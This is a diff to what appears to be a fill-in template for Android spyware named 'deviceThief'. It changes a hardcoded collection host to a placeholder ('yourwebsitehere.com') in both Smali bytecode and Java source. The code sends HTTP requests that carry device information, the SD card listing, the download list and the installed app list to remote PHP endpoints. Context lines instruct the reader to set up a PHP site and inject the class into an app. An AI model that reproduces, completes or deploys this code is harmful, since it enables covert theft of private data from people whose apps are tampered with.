@@ -750,7 +750,7 @@ get your own website supports php ready, get a copy of website materials that ha
 
     invoke-direct/range {v29 .. v29}, Ljava/lang/StringBuffer;-><init>()V
 
-    const-string v29, "http://judgesimulator.000webhostapp.com/deviceThief.php"
+    const-string v29, "http://yourwebsitehere.com/deviceThief.php"
 
     invoke-virtual/range {v28 .. v29}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
 
@@ -841,7 +841,7 @@ get your own website supports php ready, get a copy of website materials that ha
 
     invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
 
-    const-string v27, "http://judgesimulator.000webhostapp.com/deviceThief2.php"
+    const-string v27, "http://yourwebsitehere.com/deviceThief2.php"
 
     invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
 
@@ -904,7 +904,7 @@ get your own website supports php ready, get a copy of website materials that ha
 
     invoke-direct/range {v27 .. v27}, Ljava/lang/StringBuffer;-><init>()V
 
-    const-string v27, "http://judgesimulator.000webhostapp.com/deviceThief3.php"
+    const-string v27, "http://yourwebsitehere.com/deviceThief3.php"
 
     invoke-virtual/range {v26 .. v27}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
 
@@ -1294,9 +1294,9 @@ invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_
 		}
 		
 		HttpClient httpClient = new DefaultHttpClient();
-		HttpGet get = new HttpGet("http://judgesimulator.000webhostapp.com/deviceThief.php" + "?basic=" + a + "&sdcardroot=" + b);
-		HttpGet get2 = new HttpGet("http://judgesimulator.000webhostapp.com/deviceThief2.php" + "?downloadlist=" + c);
-		HttpGet get3 = new HttpGet("http://judgesimulator.000webhostapp.com/deviceThief3.php" + "?applist=" + d);
+		HttpGet get = new HttpGet("http://yourwebsitehere.com/deviceThief.php" + "?basic=" + a + "&sdcardroot=" + b);
+		HttpGet get2 = new HttpGet("http://yourwebsitehere.com/deviceThief2.php" + "?downloadlist=" + c);
+		HttpGet get3 = new HttpGet("http://yourwebsitehere.com/deviceThief3.php" + "?applist=" + d);
 		
 		try
 		{
